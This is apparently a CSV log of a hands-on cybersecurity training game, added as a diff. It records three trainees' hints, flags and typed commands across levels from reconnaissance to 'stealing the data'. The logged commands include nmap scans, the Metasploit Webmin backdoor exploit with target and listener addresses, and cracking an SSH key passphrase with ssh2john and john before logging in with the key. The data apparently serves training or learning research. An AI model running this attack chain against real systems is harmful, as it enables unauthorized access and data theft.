@@ -1,0 +1,292 @@
+trainee,level,timestamp,event_type,event,game_param,cmd_param,event_detail
+1,39,14.5.2020 10:03:27,game,LevelStarted,39,,INFO: Storyline
+1,40,14.5.2020 10:04:51,game,LevelStarted,40,,GAME: Reconnaissance
+1,40,14.5.2020 10:15:20,game,HintTaken,40-1,,HINT: (40-1) What tool to use??
+1,40,14.5.2020 10:22:11,game,CorrectFlagSubmitted,,,
+1,41,14.5.2020 10:22:11,game,LevelStarted,41,,GAME: Exploiting vulnerability
+1,41,14.5.2020 10:36:05,game,HintTaken,41-1,,HINT: (41-1) What tool to use??
+1,41,14.5.2020 10:51:34,game,HintTaken,41-2,,HINT: (41-2) What exploit to use?
+1,41,14.5.2020 10:59:08,game,SolutionDisplayed,,,
+1,41,14.5.2020 11:02:36,game,CorrectFlagSubmitted,,,
+1,41,14.5.2020 11:02:37,game,SolutionDisplayed,,,
+1,42,14.5.2020 11:02:37,game,LevelStarted,42,,GAME: Looking for something useful
+1,42,14.5.2020 11:03:20,game,HintTaken,42-1,,HINT: (42-1) Where to look for such file?
+1,42,14.5.2020 11:09:32,game,WrongFlagSubmitted,keys,,
+1,42,14.5.2020 11:09:43,game,CorrectFlagSubmitted,,,
+1,43,14.5.2020 11:09:44,game,LevelStarted,43,,GAME: Cracking SSH key passphrase
+1,43,14.5.2020 11:18:52,game,HintTaken,43-1,,HINT: (43-1) What's the name of the cracking tool?
+1,43,14.5.2020 11:50:42,game,WrongFlagSubmitted,1g,,
+1,43,14.5.2020 11:51:08,game,CorrectFlagSubmitted,,,
+1,44,14.5.2020 11:51:08,game,LevelStarted,44,,GAME: Stealing the data
+1,44,14.5.2020 11:59:01,game,HintTaken,44-1,,HINT: (44-1) How to use the key?
+1,44,14.5.2020 12:06:18,game,CorrectFlagSubmitted,,,
+1,45,14.5.2020 12:06:19,game,LevelStarted,45,,INFO: Ending
+1,45,14.5.2020 12:06:39,game,TrainingRunEnded,,,
+2,39,14.5.2020 10:02:12,game,LevelStarted,39,,INFO: Storyline
+2,40,14.5.2020 10:03:18,game,LevelStarted,40,,GAME: Reconnaissance
+2,40,14.5.2020 10:08:09,game,HintTaken,40-1,,HINT: (40-1) What tool to use??
+2,40,14.5.2020 10:08:46,game,HintTaken,40-2,,HINT: (40-2) What port to look for?
+2,40,14.5.2020 10:13:08,game,CorrectFlagSubmitted,,,
+2,41,14.5.2020 10:13:08,game,LevelStarted,41,,GAME: Exploiting vulnerability
+2,41,14.5.2020 10:14:14,game,HintTaken,41-1,,HINT: (41-1) What tool to use??
+2,41,14.5.2020 10:14:52,game,HintTaken,41-2,,HINT: (41-2) What exploit to use?
+2,41,14.5.2020 10:28:21,game,SolutionDisplayed,,,
+2,41,14.5.2020 10:35:26,game,CorrectFlagSubmitted,,,
+2,41,14.5.2020 10:35:26,game,SolutionDisplayed,,,
+2,42,14.5.2020 10:35:26,game,LevelStarted,42,,GAME: Looking for something useful
+2,42,14.5.2020 10:37:05,game,HintTaken,42-1,,HINT: (42-1) Where to look for such file?
+2,42,14.5.2020 10:37:10,game,HintTaken,42-2,,HINT: (42-2) How to download the file?
+2,42,14.5.2020 10:51:41,game,CorrectFlagSubmitted,,,
+2,43,14.5.2020 10:51:42,game,LevelStarted,43,,GAME: Cracking SSH key passphrase
+2,43,14.5.2020 10:52:59,game,HintTaken,43-1,,HINT: (43-1) What's the name of the cracking tool?
+2,43,14.5.2020 10:53:03,game,HintTaken,43-2,,HINT: (43-2) What needs to be done before cracking?
+2,43,14.5.2020 11:12:23,game,SolutionDisplayed,,,
+2,43,14.5.2020 11:26:19,game,CorrectFlagSubmitted,,,
+2,43,14.5.2020 11:26:19,game,SolutionDisplayed,,,
+2,44,14.5.2020 11:26:20,game,LevelStarted,44,,GAME: Stealing the data
+2,44,14.5.2020 11:29:09,game,HintTaken,44-1,,HINT: (44-1) How to use the key?
+2,44,14.5.2020 11:29:13,game,HintTaken,44-2,,HINT: (44-2) In what format addresses are?
+2,44,14.5.2020 11:29:19,game,HintTaken,44-3,,HINT: (44-3) Where to look for passwords?
+2,44,14.5.2020 11:43:34,game,CorrectFlagSubmitted,,,
+2,45,14.5.2020 11:43:34,game,LevelStarted,45,,INFO: Ending
+2,45,14.5.2020 11:44:00,game,TrainingRunEnded,,,
+3,39,14.5.2020 10:08:58,game,LevelStarted,39,,INFO: Storyline
+3,40,14.5.2020 10:10:04,game,LevelStarted,40,,GAME: Reconnaissance
+3,40,14.5.2020 10:12:45,game,HintTaken,40-1,,HINT: (40-1) What tool to use??
+3,40,14.5.2020 10:32:15,game,CorrectFlagSubmitted,,,
+3,41,14.5.2020 10:32:16,game,LevelStarted,41,,GAME: Exploiting vulnerability
+3,41,14.5.2020 10:35:29,game,HintTaken,41-1,,HINT: (41-1) What tool to use??
+3,41,14.5.2020 10:37:28,game,HintTaken,41-2,,HINT: (41-2) What exploit to use?
+3,41,14.5.2020 11:04:36,game,WrongFlagSubmitted,49357,,
+3,41,14.5.2020 11:05:01,game,CorrectFlagSubmitted,,,
+3,42,14.5.2020 11:05:01,game,LevelStarted,42,,GAME: Looking for something useful
+3,42,14.5.2020 11:07:40,game,HintTaken,42-1,,HINT: (42-1) Where to look for such file?
+3,42,14.5.2020 11:07:48,game,HintTaken,42-2,,HINT: (42-2) How to download the file?
+3,42,14.5.2020 11:25:21,game,WrongFlagSubmitted,.ssh,,
+3,42,14.5.2020 11:26:00,game,CorrectFlagSubmitted,,,
+3,43,14.5.2020 11:26:00,game,LevelStarted,43,,GAME: Cracking SSH key passphrase
+3,43,14.5.2020 11:29:33,game,HintTaken,43-1,,HINT: (43-1) What's the name of the cracking tool?
+3,43,14.5.2020 11:29:40,game,HintTaken,43-2,,HINT: (43-2) What needs to be done before cracking?
+3,43,14.5.2020 12:09:12,game,CorrectFlagSubmitted,,,
+3,44,14.5.2020 12:09:12,game,LevelStarted,44,,GAME: Stealing the data
+3,44,14.5.2020 12:16:25,game,HintTaken,44-1,,HINT: (44-1) How to use the key?
+3,44,14.5.2020 12:16:29,game,HintTaken,44-2,,HINT: (44-2) In what format addresses are?
+3,44,14.5.2020 12:34:37,game,HintTaken,44-3,,HINT: (44-3) Where to look for passwords?
+3,44,14.5.2020 12:36:28,game,CorrectFlagSubmitted,,,
+3,45,14.5.2020 12:36:29,game,LevelStarted,45,,INFO: Ending
+3,45,14.5.2020 12:36:45,game,TrainingRunEnded,,,
+1,40,14.5.2020 10:09:30,bash-command,ip,,config,/root
+1,40,14.5.2020 10:09:41,bash-command,ipconfig,,,/root
+1,40,14.5.2020 10:09:44,bash-command,ip,,help,/root
+1,40,14.5.2020 10:09:59,bash-command,ip,,,/root
+1,40,14.5.2020 10:11:00,bash-command,ls,,,/root
+1,40,14.5.2020 10:12:19,bash-command,connect,,,/root
+1,40,14.5.2020 10:16:11,bash-command,nmap,,,/root
+1,40,14.5.2020 10:16:58,bash-command,nmap,,-sL,/root
+1,40,14.5.2020 10:17:59,bash-command,nmap,,-sL 10.1.26.9:5050,/root
+1,40,14.5.2020 10:18:32,bash-command,nmap,,-v -sn 10.1.26.9:5050,/root
+1,40,14.5.2020 10:18:44,bash-command,nmap,,-v -sn 10.1.26.9,/root
+1,40,14.5.2020 10:19:00,bash-command,nmap,,-sL 10.1.26.9,/root
+1,40,14.5.2020 10:20:43,bash-command,nmap,,10.1.26.9,/root
+1,41,14.5.2020 10:29:42,bash-command,ip,,localhost:10000,/root
+1,41,14.5.2020 10:36:38,bash-command,metasploit,,,/root
+1,41,14.5.2020 10:37:28,bash-command,nmap,,10.1.26.9,/root
+1,41,14.5.2020 10:39:45,bash-command,nsf,,,/root
+1,41,14.5.2020 10:40:47,bash-command,run,,,/root
+1,41,14.5.2020 10:40:58,bash-command,use,,,/root
+1,41,14.5.2020 10:41:05,bash-command,msf,,,/root
+1,41,14.5.2020 10:41:20,bash-command,msf5,,,/root
+1,41,14.5.2020 10:43:11,bash-command,msfconsole,,,/root
+1,41,14.5.2020 10:48:26,bash-command,msfconsole,,,/root
+1,41,14.5.2020 10:49:55,msf-command,use,,exploit/windows/smb/psexec,
+1,41,14.5.2020 10:50:31,msf-command,set,,RHOST 10.1.26.9,
+1,41,14.5.2020 10:50:44,msf-command,set,,RPORT 10000,
+1,41,14.5.2020 10:50:56,msf-command,exploit,,,
+1,41,14.5.2020 10:52:55,msf-command,use,,exploit/unix/webapp/webmin_backdoor,
+1,41,14.5.2020 10:53:22,msf-command,exploit,,-j,
+1,41,14.5.2020 10:53:50,msf-command,set,,LHOST 10.1.26.9,
+1,41,14.5.2020 10:54:14,msf-command,set,,RHOST 10.1.26.9,
+1,41,14.5.2020 10:54:22,msf-command,exploit,,,
+1,41,14.5.2020 10:54:44,msf-command,exploit,,-j,
+1,41,14.5.2020 10:56:24,msf-command,set,,RPORT 10000,
+1,41,14.5.2020 10:56:33,msf-command,exploit ,,,
+1,41,14.5.2020 10:56:53,msf-command,set,,LPORT 10000,
+1,41,14.5.2020 10:56:57,msf-command,exploit,,,
+1,41,14.5.2020 10:58:09,msf-command,search,,portscan,
+1,41,14.5.2020 10:59:51,msf-command,set,, LHOST 10.1.135.83,
+1,41,14.5.2020 11:00:02,msf-command,set,,SSL true,
+1,41,14.5.2020 11:00:14,msf-command,set,,TARGET 1,
+1,43,14.5.2020 11:16:53,bash-command,ls,,,/root
+1,43,14.5.2020 11:17:32,bash-command,cat,,best_key,/root
+1,43,14.5.2020 11:20:58,bash-command,cd,,/john,/root
+1,43,14.5.2020 11:22:13,bash-command,ls,,,/root
+1,43,14.5.2020 11:22:44,bash-command,$ /usr/sbin/john,,best_key,/root
+1,43,14.5.2020 11:24:10,bash-command,/usr/sbin/mailer,,best_key,/root
+1,43,14.5.2020 11:25:26,bash-command,john,,,/root
+1,43,14.5.2020 11:26:27,bash-command,john,,best_key,/root
+1,43,14.5.2020 11:28:01,bash-command,unafs,,,/root
+1,43,14.5.2020 11:31:00,bash-command,unshadow,,,/root
+1,43,14.5.2020 11:34:00,bash-command,python,,ssh2john.py best_key > best_key.hash,/root
+1,43,14.5.2020 11:34:31,bash-command,ls,,,/root
+1,43,14.5.2020 11:35:18,bash-command,locate,,ssh2john.py,/root
+1,43,14.5.2020 11:36:49,bash-command,python,,/usr/share/john/ssh2john.py best_key > best_key.hash,/root
+1,43,14.5.2020 11:37:42,bash-command,john,,best_key.hash /usr/share/wordlists/fasttrack.txt,/root
+1,43,14.5.2020 11:47:56,bash-command,john,,best_key.hash --wordlist=/usr/share/wordlists/fasttrack.txt,/root
+1,43,14.5.2020 11:48:09,bash-command,ls,,,/root
+1,43,14.5.2020 11:48:20,bash-command,cat,,best_key.hash,/root
+1,43,14.5.2020 11:49:36,bash-command,john,,best_key.hash --wordlist=/usr/share/wordlists/fasttrack.txt,/root
+1,44,14.5.2020 11:56:33,bash-command,ssh,,Iwillcrushyou@10.1.26.9,/root
+1,44,14.5.2020 11:58:10,bash-command,ssh,,Iwillcrushyou@10.1.17.4,/root
+1,44,14.5.2020 11:59:59,bash-command,ssh,,-i best_key Iwillcrushyou@10.1.17.4,/root
+1,44,14.5.2020 12:01:57,bash-command,chmod,,400 best_key,/root
+1,44,14.5.2020 12:02:00,bash-command,ssh,,-i best_key Iwillcrushyou@10.1.17.4,/root
+2,40,14.5.2020 10:08:27,bash-command,Nmap,,,/root
+2,40,14.5.2020 10:10:02,bash-command,Nmap,,"46035,88194",/root
+2,40,14.5.2020 10:11:36,bash-command,sudo,,nmap 10.2.26.9:5050,/root
+2,40,14.5.2020 10:12:33,bash-command,Nmap,,10.1.26.9,/root
+2,41,14.5.2020 10:14:29,bash-command,ls,,,/root
+2,41,14.5.2020 10:15:35,bash-command,nsfconsole,,,/root
+2,41,14.5.2020 10:17:31,bash-command,module,,exploit/webapp/webmin_backdoor,/root
+2,41,14.5.2020 10:17:49,bash-command,ls,,,/root
+2,41,14.5.2020 10:18:02,bash-command,cd,,Documents/,/root
+2,41,14.5.2020 10:18:03,bash-command,ls,,,/root/Documents
+2,41,14.5.2020 10:18:07,bash-command,cd,,..,/root/Documents
+2,41,14.5.2020 10:22:38,bash-command,ssh,,10.1.26.9,/root
+2,41,14.5.2020 10:25:34,bash-command,exploit,,-j,/root
+2,41,14.5.2020 10:26:51,bash-command,use,,exploit/unix/webapp/webmin_backdoor,/root
+2,41,14.5.2020 10:27:22,bash-command,use,,metasploit,/root
+2,41,14.5.2020 10:27:24,bash-command,use,,exploit,/root
+2,41,14.5.2020 10:28:27,bash-command,msfconsole,,,/root
+2,41,14.5.2020 10:31:24,msf-command,use,,explot/unix/webapp/webmin_backdoor,
+2,41,14.5.2020 10:31:43,msf-command,use,,exploit/unix/webapp/webmin_backdoor,
+2,41,14.5.2020 10:32:44,msf-command,set,,RHOST 10.1.26.9,
+2,41,14.5.2020 10:34:19,msf-command,set,,LHOST 10.1.135.83,
+2,41,14.5.2020 10:34:27,msf-command,set,,SSL true,
+2,41,14.5.2020 10:34:35,msf-command,set,,TARGET 1,
+2,43,14.5.2020 10:54:06,bash-command,cd,,usr,/root
+2,43,14.5.2020 10:54:18,bash-command,cd,,share,/root
+2,43,14.5.2020 10:54:19,bash-command,ls,,,/root
+2,43,14.5.2020 10:55:16,bash-command,john,,best_key,/root
+2,43,14.5.2020 10:55:22,bash-command,ls,,,/root
+2,43,14.5.2020 10:55:32,bash-command,cat,,best_key,/root
+2,43,14.5.2020 10:55:53,bash-command,ssh2john,,,/root
+2,43,14.5.2020 10:55:56,bash-command,ssh,,john,/root
+2,43,14.5.2020 10:57:42,bash-command,./john.exe,,,/root
+2,43,14.5.2020 10:57:45,bash-command,./john,,,/root
+2,43,14.5.2020 10:57:51,bash-command,cd,,john,/root
+2,43,14.5.2020 10:59:09,bash-command,./john.exe,,best_key,/root
+2,43,14.5.2020 10:59:37,bash-command,.\john.exe,,,/root
+2,43,14.5.2020 11:03:45,bash-command,ssh2john,,id_rsa > best_key,/root
+2,43,14.5.2020 11:05:14,bash-command,ls,,,/root
+2,43,14.5.2020 11:06:48,bash-command,cd,,Documents/,/root
+2,43,14.5.2020 11:06:49,bash-command,ls,,,/root/Documents
+2,43,14.5.2020 11:06:52,bash-command,cd,,..,/root/Documents
+2,43,14.5.2020 11:08:04,bash-command,john,,--worldlist=fasttrack.txt best_key,/root
+2,43,14.5.2020 11:08:10,bash-command,john,,best_key,/root
+2,43,14.5.2020 11:08:47,bash-command,cd,,usr/share/john,/root
+2,43,14.5.2020 11:11:01,bash-command,.john,,,/root
+2,43,14.5.2020 11:13:24,bash-command,cd,,usr/share/john,/root
+2,43,14.5.2020 11:13:30,bash-command,pwd,,,/root
+2,43,14.5.2020 11:14:13,bash-command,pwd,,,/root
+2,43,14.5.2020 11:14:37,bash-command,cd,,/usr/share/john,/root
+2,43,14.5.2020 11:14:43,bash-command,pwd,,,/usr/share/john
+2,43,14.5.2020 11:15:19,bash-command,ls,,,/usr/share/john
+2,43,14.5.2020 11:15:57,bash-command,ssh2john.py,,best_key > best_key.hash,/usr/share/john
+2,43,14.5.2020 11:16:17,bash-command,cd,,..,/usr/share/john
+2,43,14.5.2020 11:16:18,bash-command,cd,,..,/usr/share
+2,43,14.5.2020 11:16:19,bash-command,cd,,..,/usr
+2,43,14.5.2020 11:16:21,bash-command,ls,,,/
+2,43,14.5.2020 11:16:23,bash-command,cd,,..,/
+2,43,14.5.2020 11:16:26,bash-command,ls,,,/
+2,43,14.5.2020 11:16:27,bash-command,pwd,,,/
+2,43,14.5.2020 11:16:29,bash-command,cd,,..,/
+2,43,14.5.2020 11:16:31,bash-command,pwd,,,/
+2,43,14.5.2020 11:16:35,bash-command,cd,,root,/
+2,43,14.5.2020 11:16:37,bash-command,pwd,,,/root
+2,43,14.5.2020 11:16:59,bash-command,/usr/share/john/ssh2john.py,,best_key > best_key.hash,/root
+2,43,14.5.2020 11:17:47,bash-command,pwd,,,/root
+2,43,14.5.2020 11:17:58,bash-command,ls,,,/root
+2,43,14.5.2020 11:18:16,bash-command,/usr/share/john/ssh2john.py,,best_key > best_key.hash,/root
+2,43,14.5.2020 11:19:27,bash-command,/usr/share/john/ssh2john.py,,best_key,/root
+2,43,14.5.2020 11:19:35,bash-command,cat,,best_key,/root
+2,43,14.5.2020 11:19:45,bash-command,cat,,authorized_keys,/root
+2,43,14.5.2020 11:19:47,bash-command,ls,,,/root
+2,43,14.5.2020 11:20:00,bash-command,rm,,best_key,/root
+2,43,14.5.2020 11:20:01,bash-command,ls,,,/root
+2,43,14.5.2020 11:20:05,bash-command,rm,,best_key.hash,/root
+2,43,14.5.2020 11:20:25,bash-command,ls,,,/root
+2,43,14.5.2020 11:20:38,bash-command,/usr/share/john/ssh2john.py,,best_key > best_key.hash,/root
+2,43,14.5.2020 11:20:40,bash-command,ls,,,/root
+2,43,14.5.2020 11:21:57,bash-command,john,,--worldlist=/usr/share/worldlist/fasttrack.txt best_key.hash,/root
+2,43,14.5.2020 11:23:22,bash-command,john,,--wordlist=/usr/share/worldlist/fasttrack.txt best_key.hash,/root
+2,43,14.5.2020 11:25:01,bash-command,john,,--wordlist=/usr/share/worldlists/fasttrack.txt best_key.hash,/root
+2,43,14.5.2020 11:25:40,bash-command,john,,--wordlist=/usr/share/wordlists/fasttrack.txt best_key.hash,/root
+2,44,14.5.2020 11:30:08,bash-command,ssh,,Iwillcrushyou@remoteserver,/root
+2,44,14.5.2020 11:34:18,bash-command,ssh,,-i Iwillcrushyou@10.1.17.4,/root
+2,44,14.5.2020 11:35:28,bash-command,ssh,,-i [-J Iwillcrushyou@10.1.17.4],/root
+2,44,14.5.2020 11:35:39,bash-command,ssh,,Iwillcrushyou@10.1.17.4,/root
+2,44,14.5.2020 11:36:46,bash-command,ssh,,[-i best_key.hash] Iwillcrushyou@10.1.17.4,/root
+2,44,14.5.2020 11:37:02,bash-command,ssh,,-i best_key.hash Iwillcrushyou@10.1.17.4,/root
+2,44,14.5.2020 11:38:22,bash-command,ssh,,-i best_key Iwillcrushyou@10.1.17.4,/root
+2,44,14.5.2020 11:41:09,bash-command,chmod,,400 best_key,/root
+2,44,14.5.2020 11:41:13,bash-command,ssh,,-i best_key Iwillcrushyou@10.1.17.4,/root
+3,40,14.5.2020 10:30:18,bash-command,nmap,,"46035,88194",/root
+3,40,14.5.2020 10:30:59,bash-command,nmap,,10.1.26.9,/root
+3,41,14.5.2020 10:46:17,bash-command,msf,,console,/root
+3,41,14.5.2020 10:47:22,bash-command,msfconsole,,msfconsole,/root
+3,41,14.5.2020 10:49:36,msf-command,use,,exploit/unix/webmin_backdoor,
+3,41,14.5.2020 10:50:45,msf-command,use,,exploit/unix/webapp/webmin_backdoor,
+3,41,14.5.2020 10:51:12,msf-command,show,,targets,
+3,41,14.5.2020 10:53:15,msf-command,exploit,,,
+3,41,14.5.2020 10:54:27,msf-command,set,,target 0,
+3,41,14.5.2020 10:54:32,msf-command,exploit,,,
+3,41,14.5.2020 10:54:52,msf-command,show,,options,
+3,41,14.5.2020 10:59:16,msf-command,set,,target 1,
+3,41,14.5.2020 10:59:43,msf-command,set,,rhost 10.1.26.9,
+3,41,14.5.2020 11:00:47,msf-command,set,,lhost 10.1.135.83,
+3,41,14.5.2020 11:02:24,msf-command,set,,ssl true,
+3,43,14.5.2020 11:43:42,msf-command,exploit,,,
+3,43,14.5.2020 11:44:04,msf-command,exit,,,
+3,43,14.5.2020 11:44:28,bash-command,cd,,/usr/share/john,/root
+3,43,14.5.2020 11:44:32,bash-command,ls,,,/usr/share/john
+3,43,14.5.2020 11:49:33,bash-command,ls,,,/root
+3,43,14.5.2020 11:49:50,bash-command,cd,,Dowloads,/root
+3,43,14.5.2020 11:49:56,bash-command,cd,,Downloads,/root
+3,43,14.5.2020 11:49:59,bash-command,ls,,,/root/Downloads
+3,43,14.5.2020 11:50:11,bash-command,ls,,-a,/root/Downloads
+3,43,14.5.2020 11:53:26,bash-command,cd,,/root,/usr/share/john
+3,43,14.5.2020 11:53:29,bash-command,ls,,,/root
+3,43,14.5.2020 11:54:15,bash-command,cd,,Downloads/,/root
+3,43,14.5.2020 11:54:17,bash-command,ls,,,/root/Downloads
+3,43,14.5.2020 11:54:21,bash-command,cd,,..,/root/Downloads
+3,43,14.5.2020 11:54:24,bash-command,ls,,,/root
+3,43,14.5.2020 11:57:05,bash-command,ls,,-a,/root
+3,43,14.5.2020 11:57:12,bash-command,cd,,.ssh,/root
+3,43,14.5.2020 11:57:15,bash-command,ls,,,/root/.ssh
+3,43,14.5.2020 11:57:44,bash-command,cd,,best_key,/root/.ssh
+3,43,14.5.2020 11:59:33,bash-command,/usr/share/john/ssh2john.py,,best_key > best?key.hash,/root/.ssh
+3,43,14.5.2020 11:59:39,bash-command,ls,,,/root/.ssh
+3,43,14.5.2020 11:59:50,bash-command,/usr/share/john/ssh2john.py,,best_key > best_key.hash,/root/.ssh
+3,43,14.5.2020 12:02:35,bash-command,/usr/share/john/john.exe,,/usr/share/worldlists/fastcrack.txt best_key.hash,/root/.ssh
+3,43,14.5.2020 12:03:13,bash-command,cat,,best_key.hash,/root/.ssh
+3,43,14.5.2020 12:05:07,bash-command,john,,--wordlist=/usr/share/worldlists/fastcrack.txt best_key.hash,/root/.ssh
+3,43,14.5.2020 12:06:14,bash-command,john,,--wordlist=/usr/share/worldlists/fasttrack.txt best_key.hash,/root/.ssh
+3,43,14.5.2020 12:07:11,bash-command,john,,--wordlist=/usr/share/wordlists/fasttrack.txt best_key.hash,/root/.ssh
+3,44,14.5.2020 12:15:03,bash-command,su,,Iwillcrushyou,/root/.ssh
+3,44,14.5.2020 12:15:39,bash-command,cd,,~,/root/.ssh
+3,44,14.5.2020 12:16:03,bash-command,ssh,,Iwillcrushyou,/root
+3,44,14.5.2020 12:18:58,bash-command,ssh,,10.1.17.4,/root
+3,44,14.5.2020 12:22:02,bash-command,ssh,,,/root
+3,44,14.5.2020 12:22:43,bash-command,pwd,,,/root
+3,44,14.5.2020 12:22:48,bash-command,ls,,,/root
+3,44,14.5.2020 12:24:04,bash-command,ssh,,-i ./.ssh/best_key 10.1.17.4,/root
+3,44,14.5.2020 12:27:17,bash-command,ssh,,-i /.ssh/best_key Iwillcrushyou@client,/root
+3,44,14.5.2020 12:27:50,bash-command,ssh,,-i ./.ssh/best_key Iwillcrushyou@client,/root
+3,44,14.5.2020 12:29:12,bash-command,ssh,,-i ./.ssh/best_key Iwillcrushyou@client,/root
+3,44,14.5.2020 12:30:29,bash-command,ssh,,-i ./.ssh/best_key Iwillcrushyou@client,/root
+3,44,14.5.2020 12:32:23,bash-command,cd,,.ssh,/root
+3,44,14.5.2020 12:33:12,bash-command,chmod,,600 best_key,/root/.ssh
+3,44,14.5.2020 12:33:25,bash-command,ls,,-al,/root/.ssh
+3,44,14.5.2020 12:33:40,bash-command,ssh,,-i ./.ssh/best_key Iwillcrushyou@client,/root/.ssh
+3,44,14.5.2020 12:33:50,bash-command,cd,,..,/root/.ssh
+3,44,14.5.2020 12:33:57,bash-command,ssh,,-i ./.ssh/best_key Iwillcrushyou@client,/root
